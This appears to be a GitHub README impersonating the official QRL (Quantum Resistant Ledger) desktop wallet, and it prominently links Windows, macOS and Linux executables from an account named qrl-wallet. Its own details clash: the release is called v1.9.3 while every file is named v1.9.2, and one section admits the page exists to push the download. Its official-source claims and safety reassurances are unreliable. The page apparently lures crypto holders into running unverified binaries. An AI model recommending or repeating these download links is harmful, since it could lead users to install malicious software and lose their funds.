![QRL Wallet](assets/banner-profile.png)

<h1 align="center">QRL Wallet</h1>

<p align="center">The desktop client for a chain that signed with post-quantum keys before it was fashionable, and still keeps every key on your machine.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-A85A00?style=for-the-badge&labelColor=0B0E14" alt="MIT licence"> <img src="https://img.shields.io/badge/RELEASE-v1.9.3-A85A00?style=for-the-badge&labelColor=0B0E14" alt="Release v1.9.3"></p>

## Downloads - v1.9.3

<p align="center"><a href="https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-win.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-A85A00?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=white&labelColor=0B0E14" alt="Download QRL Wallet for Windows"></a> <a href="https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-darwin.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-A85A00?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0E14" alt="Download QRL Wallet for macOS"></a> <a href="https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-A85A00?style=for-the-badge&logo=linux&logoColor=white&labelColor=0B0E14" alt="Download QRL Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-A85A00?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=white&labelColor=0B0E14" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`QRL-Desktop-Wallet-v1.9.2-win.exe`](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-win.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-A85A00?style=flat-square&logo=apple&logoColor=white&labelColor=0B0E14" alt="macOS"> | macOS 12 or later | [`QRL-Desktop-Wallet-v1.9.2-darwin.dmg`](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-darwin.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-A85A00?style=flat-square&logo=linux&logoColor=white&labelColor=0B0E14" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`QRL-Desktop-Wallet-v1.9.2-linux.zip`](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/download/v1.9.3/QRL-Desktop-Wallet-v1.9.2-linux.zip) |

</div>

Every published digest is listed on the [release page](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/tag/v1.9.3).

> Only download from this GitHub release page.

## What this repository is for

This page belongs to QRL, the Quantum Resistant Ledger, and its job is to get you to a wallet you can trust. The chain has been running since 2018 and signs every transaction with XMSS, a hash-based scheme that does not rest on the elliptic-curve problems a quantum computer would attack. The wallet that signs those transactions is the one this account documents, and every guide behind this page assumes you are going to install it and check it before you use it.

It is written for someone who has heard one of the three usual sentences about QRL, that it is old, that it is quantum proof, or that it is confusing, and wants the practical answer. What the wallet does, where the keys live, which file belongs on which machine and what happens when an address runs out of one-time keys are all documented in the repositories linked below, in plain language rather than in protocol notes.

## Who it is for

- **A holder who wants the keys on their own disk**, with no account, no custodian and nothing to sign up for.
- **Someone who takes the quantum claim seriously**, and wants a wallet that signs with post-quantum keys today rather than one that plans to.
- **A reader who checks what they download**, and wants a published digest for the exact file they are about to run.
- **A Ledger owner**, who wants each signature approved on a device rather than on a laptop keyboard.

## Why this wallet

Self-custody is the whole design. The wallet writes a file on your machine, locks it with a password you choose, and derives addresses from it, so there is no server that could freeze a balance and no login that could be reset by somebody else. What you back up is what you keep, and the guides explain how to test that backup before it matters.

The post-quantum part is not an announcement. QRL's signatures are hash-based and have been since the network launched, which is why the wallet does something most wallets do not: it tracks a finite supply of one-time keys under each address and shows you how many remain. That number is the difference between a wallet that behaves like every other one and a wallet that has to be understood.

Nothing here asks for your phrase. The wallet never needs it, the guides never request it, and no support channel will offer to recover a wallet for a fee.

## This repository's part

This repository is the QRL project's own repository on this account, and the wallet pages here are written to send you to the download above rather than to describe this repository's contents.

## Guides

<div align="center">

| Guide | What it settles |
| --- | --- |
| [What Is the QRL Quantum Resistant Ledger?](https://github.com/qrl-wallet/token-facts-and-prices/blob/main/what-is-the-qrl-quantum-resistant-ledger.md) | This guide defines the project, its chain and what quantum resistant means for a holder today. |
| [Download the Official QRL Wallet](https://github.com/qrl-wallet/wallet-setup-and-repair/blob/main/download-the-official-qrl-wallet.md) | This page names the file for each platform and the release page where all three are published. |
| [Create Your First QRL Address](https://github.com/qrl-wallet/wallet-setup-and-repair/blob/main/create-your-first-qrl-address.md) | This guide covers the password, the wallet file and the phrase you store before funding anything. |
| [How XMSS Signatures Work](https://github.com/qrl-wallet/signatures-and-comparisons/blob/main/how-qrl-xmss-signatures-work.md) | This guide builds the tree and the one-time keys that authorise every QRL transaction. |
| [All the wallet guides](https://github.com/qrl-wallet/wallet-setup-and-repair) | This repository holds the twenty setup and repair guides in reading order. |

</div>

## Common first questions

### Does the wallet need an account?

No. It writes a file on your own machine, and the password you choose is the only credential involved anywhere in the process.

### Which file belongs on my machine?

The Windows installer, the macOS disk image, or the Linux archive that holds both the Debian and the Arch package formats inside it.

### Is my balance held anywhere?

No. Your keys sit in your wallet file and the chain records the balance against your address, so nothing is held on your behalf.

**The wallet never asks for your recovery phrase, and no support channel will either.**

## Support

Questions about a failure belong in the repair guides linked above. Questions about this repository belong in its issue tracker.

## License

MIT.

---

The software lives on [the desktop wallet repository](https://github.com/qrl-wallet/qrl-desktop-wallet), the release is [v1.9.3](https://github.com/qrl-wallet/qrl-desktop-wallet/releases/tag/v1.9.3), and the documentation is in [token-facts-and-prices](https://github.com/qrl-wallet/token-facts-and-prices), [wallet-setup-and-repair](https://github.com/qrl-wallet/wallet-setup-and-repair) and [signatures-and-comparisons](https://github.com/qrl-wallet/signatures-and-comparisons).
